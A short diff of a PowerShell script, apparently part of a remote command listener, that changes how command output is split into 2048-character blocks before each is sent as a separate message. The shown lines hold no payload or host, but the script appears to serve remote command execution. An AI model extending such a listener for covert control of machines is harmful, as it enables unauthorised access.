@@ -192,8 +192,8 @@ function CommandListener
                         catch { $output = $Error[0] | Out-String }
 
                         # Suddivide l'output in blocchi più piccoli per evitare limiti di dimensione
-                        $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 4095) {
-                            $output.Substring($i, [Math]::Min(4095, $output.Length - $i))
+                        $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 2048) {
+                            $output.Substring($i, [Math]::Min(2048, $output.Length - $i))
                         }
 
                         # Invia ciascun blocco di output come messaggio separato
